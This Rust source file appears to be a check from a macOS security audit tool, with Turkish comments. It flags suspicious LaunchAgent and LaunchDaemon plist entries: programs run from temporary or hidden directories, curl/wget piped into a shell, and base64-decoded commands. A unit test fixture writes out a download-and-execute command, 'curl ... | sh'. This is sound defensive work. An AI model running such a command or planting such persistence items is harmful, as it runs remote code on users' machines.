//! Kalıcılık (persistence) kontrolü: açılışta çalışan LaunchAgent ve
//! LaunchDaemon öğeleri arasında şüpheli görünen var mı?
//!
//! Kötü amaçlı yazılımlar yeniden başlatmadan sonra da çalışabilmek için
//! sıkça bu dizinlere bir `.plist` bırakır. Buradaki tarama basit sezgisel
//! kurallara dayanır; kesin hüküm değil, "bir göz at" uyarısıdır.

use super::{Check, Outcome, Severity};
use crate::runner::CommandRunner;
use serde_json::Value;
use std::path::{Path, PathBuf};

pub struct LaunchItems;

/// Programın buralardan çalışması olağan dışıdır.
const TEMP_DIRS: [&str; 5] = [
    "/tmp/",
    "/private/tmp/",
    "/var/tmp/",
    "/private/var/tmp/",
    "/Users/Shared/",
];

impl Check for LaunchItems {
    fn id(&self) -> &'static str {
        "launch-items"
    }
    fn name(&self) -> &'static str {
        "Başlangıç öğeleri"
    }
    fn weight(&self) -> u32 {
        10
    }
    fn severity(&self) -> Severity {
        Severity::Medium
    }

    fn run(&self, runner: &dyn CommandRunner) -> Outcome {
        let plists = find_plists(&launch_dirs());
        let mut suspicious: Vec<String> = Vec::new();
        let mut unreadable = 0;

        for path in &plists {
            // `plutil` plist'i JSON'a çevirir; dosyayı değiştirmez (`-o -`
            // sonucu stdout'a yazar).
            let json = runner
                .run("plutil", &["-convert", "json", "-o", "-", &path.to_string_lossy()])
                .ok()
                .filter(|out| out.success)
                .and_then(|out| serde_json::from_str::<Value>(&out.stdout).ok());

            match json {
                Some(plist) => {
                    if let Some(reason) = suspicion(&plist) {
                        let file = path.file_name().unwrap_or_default().to_string_lossy();
                        suspicious.push(format!("{file} ({reason})"));
                    }
                }
                None => unreadable += 1,
            }
        }

        if !suspicious.is_empty() {
            return Outcome::warn(
                format!("Şüpheli öğeler: {}.", suspicious.join(", ")),
                "Tanımadığın öğeleri incele; gereksizse ilgili .plist dosyasını kaldır.",
            );
        }

        let mut detail = format!("{} öğe incelendi, şüpheli bulunmadı", plists.len());
        if unreadable > 0 {
            detail.push_str(&format!(" ({unreadable} tanesi okunamadı)"));
        }
        detail.push('.');
        Outcome::pass(detail)
    }
}

/// Taranacak dizinler: sistem geneli ve geçerli kullanıcıya ait olanlar.
fn launch_dirs() -> Vec<PathBuf> {
    let mut dirs = vec![
        PathBuf::from("/Library/LaunchAgents"),
        PathBuf::from("/Library/LaunchDaemons"),
    ];
    if let Some(home) = std::env::var_os("HOME") {
        dirs.push(Path::new(&home).join("Library/LaunchAgents"));
    }
    dirs
}

/// Dizinlerdeki `.plist` dosyalarını sıralı olarak toplar. Okunamayan ya da
/// var olmayan dizinler sessizce atlanır.
fn find_plists(dirs: &[PathBuf]) -> Vec<PathBuf> {
    let mut plists: Vec<PathBuf> = dirs
        .iter()
        .filter_map(|dir| std::fs::read_dir(dir).ok())
        .flatten() // dizin girdileri
        .filter_map(Result::ok)
        .map(|entry| entry.path())
        .filter(|path| path.extension().is_some_and(|ext| ext == "plist"))
        .collect();
    plists.sort();
    plists
}

/// Bir başlangıç öğesi şüpheli görünüyorsa nedenini döndürür.
fn suspicion(plist: &Value) -> Option<&'static str> {
    // Çalıştırılan komut: `Program` anahtarı ve/veya `ProgramArguments` dizisi.
    let mut command: Vec<&str> = Vec::new();
    if let Some(program) = plist.get("Program").and_then(Value::as_str) {
        command.push(program);
    }
    if let Some(args) = plist.get("ProgramArguments").and_then(Value::as_array) {
        command.extend(args.iter().filter_map(Value::as_str));
    }

    let program = *command.first()?;
    let joined = command.join(" ");

    if TEMP_DIRS.iter().any(|dir| program.starts_with(dir)) {
        return Some("geçici/ortak dizinden çalışıyor");
    }
    // "/Users/x/.gizli/arac" gibi nokta ile başlayan bir yol bileşeni.
    if program.split('/').any(|part| part.starts_with('.') && part.len() > 1) {
        return Some("gizli dizinden çalışıyor");
    }
    let downloads = joined.contains("curl ") || joined.contains("wget ");
    let pipes_to_shell = ["| sh", "|sh", "| bash", "|bash", "| zsh", "|zsh"]
        .iter()
        .any(|pattern| joined.contains(pattern));
    if downloads && pipes_to_shell {
        return Some("indirdiği betiği doğrudan çalıştırıyor");
    }
    if joined.contains("base64") && (joined.contains(" -d") || joined.contains("--decode")) {
        return Some("base64 ile gizlenmiş komut çalıştırıyor");
    }
    None
}

#[cfg(test)]
mod tests {
    use super::*;
    use serde_json::json;

    #[test]
    fn olagan_uygulama_supheli_degil() {
        let plist = json!({
            "Label": "com.cloudflare.warp",
            "ProgramArguments": ["/Applications/Cloudflare WARP.app/Contents/Resources/CloudflareWARP"],
        });
        assert_eq!(suspicion(&plist), None);
    }

    #[test]
    fn gecici_dizinden_calisan_supheli() {
        let plist = json!({ "Program": "/tmp/updater" });
        assert_eq!(suspicion(&plist), Some("geçici/ortak dizinden çalışıyor"));

        let shared = json!({ "ProgramArguments": ["/Users/Shared/helper", "--daemon"] });
        assert!(suspicion(&shared).is_some());
    }

    #[test]
    fn gizli_dizin_supheli() {
        let plist = json!({ "ProgramArguments": ["/Users/ayse/.cache/agent"] });
        assert_eq!(suspicion(&plist), Some("gizli dizinden çalışıyor"));
    }

    #[test]
    fn indirip_calistirma_supheli() {
        let plist = json!({
            "ProgramArguments": ["/bin/sh", "-c", "curl -s http://example.com/x | sh"],
        });
        assert_eq!(
            suspicion(&plist),
            Some("indirdiği betiği doğrudan çalıştırıyor")
        );
    }

    #[test]
    fn komutsuz_plist_atlanir() {
        assert_eq!(suspicion(&json!({ "Label": "bos" })), None);
    }

    #[test]
    fn yalnizca_plist_dosyalari_toplanir() {
        let dir = std::env::temp_dir().join(format!("macos-audit-test-{}", std::process::id()));
        std::fs::create_dir_all(&dir).unwrap();
        std::fs::write(dir.join("b.plist"), "").unwrap();
        std::fs::write(dir.join("a.plist"), "").unwrap();
        std::fs::write(dir.join("not.txt"), "").unwrap();

        let found = find_plists(&[dir.clone(), dir.join("yok")]);
        std::fs::remove_dir_all(&dir).unwrap();

        let names: Vec<_> = found
            .iter()
            .map(|path| path.file_name().unwrap().to_string_lossy().into_owned())
            .collect();
        assert_eq!(names, ["a.plist", "b.plist"]);
    }
}
